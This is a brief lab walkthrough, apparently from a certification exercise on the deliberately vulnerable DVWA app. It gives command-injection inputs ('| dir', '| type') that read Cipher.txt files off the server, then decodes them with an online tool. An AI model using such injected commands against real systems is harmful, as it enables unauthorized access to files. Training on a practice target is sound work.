...
login to the dvwa application > set security level low > choose command execution type below commands: | dir "C:\xxxx\www\xx\ECweb\Certified" > there are 3 Cipher.txt files. | type "C:\Wamp64\www\xxxx\xxxx\xxxx\Cipher1.txt" | type "C:\xxxx\www\xxxx\ECweb\Certified\Cipher2.txt" | type "C:\xxxx\www\xxxx\xxxx\Certified\Cipher3.txt" Use online cyber-chief application 
